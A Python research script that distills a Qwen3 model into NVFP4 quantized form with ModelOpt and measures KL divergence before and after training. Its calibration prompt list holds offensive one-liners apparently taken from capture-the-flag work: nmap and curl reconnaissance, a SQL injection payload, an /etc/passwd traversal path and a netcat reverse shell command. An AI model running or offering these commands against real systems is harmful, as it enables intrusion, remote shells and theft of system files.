"""
QAD Experiment — NVFP4 edition (ModelOpt + STE, no LoRA).

Instead of waiting for real trajectory calibration data, we use the teacher
model to generate its own calibration sequences. This is valid because:
  - QAD only needs token sequences (no labels, no task structure)
  - The paper uses "model-generated data from RL prompts" as one valid source
  - Teacher-generated sequences are in-distribution for the teacher — ideal for KL matching

LoRA is no longer needed. ModelOpt fake-quantizes weights in NVFP4 (E2M1) format
with straight-through estimators (STE) so gradients flow directly through the
quantized weights. The same weights that are quantized are what get updated.

Experiment knobs you can tune:
  PROMPTS        — what topics/styles the calibration sequences cover
  MAX_NEW_TOKENS — length of generated sequences (longer = more KL signal per step)
  STEPS          — QAD training steps
  LR             — learning rate
  TEMPERATURE    — softness of distributions (higher = more stable but less precise)
"""

import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM
import modelopt.torch.quantization as mtq

# ── CONFIG ────────────────────────────────────────────────────────────────────

MODEL_NAME     = "Qwen/Qwen3-0.6B"   # swap to 14B on server
DEVICE         = "cuda" if torch.cuda.is_available() else "cpu"
MAX_NEW_TOKENS = 80
STEPS          = 100
LR             = 1e-5
TEMPERATURE    = 2.0

# NVFP4: ModelOpt's canonical W4A4 NVFP4 recipe (E2M1 weights + activations,
# block size 16, two-level FP8/FP32 scaling). Matches real Blackwell deployment.
NVFP4_CFG = mtq.NVFP4_DEFAULT_CFG

PROMPTS = [
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
]

# ── MODEL LOADING ─────────────────────────────────────────────────────────────

print(f"Device: {DEVICE}  |  Model: {MODEL_NAME}\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token


def load_teacher() -> torch.nn.Module:
    """BF16 full-precision model — frozen during QAD."""
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )
    model.eval()
    for p in model.parameters():
        p.requires_grad = False
    return model


def load_nvfp4(calibration_data: list[torch.Tensor]) -> torch.nn.Module:
    """
    NVFP4 model via ModelOpt fake quantization with STE.

    mtq.quantize() runs a calibration forward pass to collect amax values
    (the per-block FP8 scales), then replaces weight ops with fake-quantized
    versions. The fake quantizers apply quantize→dequantize on each forward,
    with STE (gradient = 1 through the quantize step) on backward.

    Use for both the RTN baseline (measure KL before any training) and the
    QAD student (train with run_qad() after this call).
    """
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=NVFP4_CFG, forward_loop=calibration_forward)
    return model


# ── CALIBRATION DATA GENERATION ───────────────────────────────────────────────

def generate_calibration_data(
    teacher: torch.nn.Module,
    prompts: list[str],
    max_new_tokens: int,
) -> list[torch.Tensor]:
    """
    Use the teacher to generate full sequences from prompts.
    No labels needed — QAD trains on ALL token positions with soft targets.
    """
    sequences = []
    print("Generating calibration sequences from teacher...")
    for prompt in prompts:
        input_ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            output = teacher.generate(
                input_ids,
                max_new_tokens=max_new_tokens,
                do_sample=True,
                temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(output)
        print(f"  [{len(sequences)}/{len(prompts)}] {output.shape[1]} tokens")
    print(f"Calibration data: {len(sequences)} sequences\n")
    return sequences


# ── KL MEASUREMENT ────────────────────────────────────────────────────────────

def measure_kl(
    model_a: torch.nn.Module,
    model_b: torch.nn.Module,
    calibration_data: list[torch.Tensor],
    temperature: float,
    label: str,
) -> float:
    model_a.eval()
    model_b.eval()
    total_kl = 0.0
    with torch.no_grad():
        for seq in calibration_data:
            logits_a = model_a(input_ids=seq).logits.clamp(-100, 100)
            logits_b = model_b(input_ids=seq).logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(logits_b / temperature, dim=-1),
                F.softmax(logits_a  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total_kl += kl.item()
    avg_kl = total_kl / len(calibration_data)
    print(f"  {label:<45} KL = {avg_kl:.4f}")
    return avg_kl


# ── QAD TRAINING ─────────────────────────────────────────────────────────────

def run_qad(
    teacher: torch.nn.Module,
    student: torch.nn.Module,
    calibration_data: list[torch.Tensor],
    steps: int,
    lr: float,
    temperature: float,
) -> list[float]:
    """
    QAD training loop. STE makes all quantized weights directly trainable.
    Returns loss history.

    Loss: forward KL(p_teacher || p_student) with temperature scaling.
    Trains ALL token positions — no masking unlike SFT/RL.
    """
    teacher.eval()
    student.train()
    optimizer = torch.optim.AdamW(student.parameters(), lr=lr)

    loss_history = []
    data_cycle   = calibration_data * (steps // len(calibration_data) + 1)

    print(f"Running QAD: steps={steps}  lr={lr}  temperature={temperature}")
    print(f"{'Step':>6}  {'KL Loss':>10}  {'Note'}")
    print("-" * 40)

    for step, seq in enumerate(data_cycle[:steps]):
        with torch.no_grad():
            teacher_logits = teacher(input_ids=seq).logits

        student_logits = student(input_ids=seq).logits
        student_logits = student_logits.clamp(-100, 100)
        teacher_logits = teacher_logits.clamp(-100, 100)

        kl_loss = F.kl_div(
            F.log_softmax(student_logits / temperature, dim=-1),
            F.softmax(teacher_logits  / temperature, dim=-1),
            reduction="batchmean",
        ) * (temperature ** 2)

        if torch.isnan(kl_loss):
            print(f"{step:>6}  {'nan':>10}  stopping — gradient instability")
            break

        optimizer.zero_grad()
        kl_loss.backward()
        torch.nn.utils.clip_grad_norm_(student.parameters(), max_norm=1.0)
        optimizer.step()

        loss_val = kl_loss.item()
        loss_history.append(loss_val)

        if step % 10 == 0:
            note = "← initial gap" if step == 0 else ""
            print(f"{step:>6}  {loss_val:>10.4f}  {note}")

    print(f"{'final':>6}  {loss_history[-1]:>10.4f}")
    drop = loss_history[0] - loss_history[-1]
    pct  = drop / loss_history[0] * 100
    print(f"\nKL drop: {drop:.4f}  ({pct:.1f}% reduction)")
    return loss_history


# ── MAIN ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== Loading Teacher (BF16) ===")
    teacher = load_teacher()

    # Calibration data generated before student loading — ModelOpt's PTQ step
    # needs a forward pass on the model to calibrate per-block FP8 scales.
    print("\n=== Generating Calibration Data ===")
    calibration_data = generate_calibration_data(teacher, PROMPTS, MAX_NEW_TOKENS)

    # ── Baselines ─────────────────────────────────────────────────────────────
    print("=== Baselines ===")
    kl_oracle = measure_kl(
        teacher, teacher, calibration_data, TEMPERATURE,
        "Oracle  — BF16 vs BF16",
    )

    print("  Loading NVFP4-RTN model (no QAD)...")
    rtn_model = load_nvfp4(calibration_data)
    kl_quant = measure_kl(
        teacher, rtn_model, calibration_data, TEMPERATURE,
        "Pre-QAD — NVFP4-RTN (no training)",
    )
    del rtn_model
    torch.cuda.empty_cache()
    print()

    # ── QAD training ──────────────────────────────────────────────────────────
    print("=== Loading NVFP4 Student ===")
    student = load_nvfp4(calibration_data)
    trainable = sum(p.numel() for p in student.parameters() if p.requires_grad)
    print(f"  Trainable params: {trainable:,}\n")

    print("=== QAD Training ===")
    loss_history = run_qad(teacher, student, calibration_data, STEPS, LR, TEMPERATURE)

    # ── Post-QAD measurement ──────────────────────────────────────────────────
    print("\n=== Post-QAD Measurement ===")
    kl_post = measure_kl(
        teacher, student, calibration_data, TEMPERATURE,
        "Post-QAD — NVFP4 + trained weights",
    )

    recovered = kl_quant - kl_post
    total_gap = kl_quant - kl_oracle
    pct       = recovered / total_gap * 100 if total_gap > 0 else 0.0

    print(f"""
=== Full Comparison ===
  Oracle  (BF16, target)       : {kl_oracle:.4f}   ← ideal, should be ~0
  Pre-QAD (NVFP4-RTN damage)   : {kl_quant:.4f}
  Post-QAD (after recovery)    : {kl_post:.4f}

  Gap closed : {recovered:.4f} / {total_gap:.4f} = {pct:.1f}% recovered toward oracle

Config: sequences={len(PROMPTS)} × ~{MAX_NEW_TOKENS}tok  steps={STEPS}  lr={LR}  T={TEMPERATURE}
Knobs  : STEPS · LR · TEMPERATURE · MAX_NEW_TOKENS · PROMPTS""")
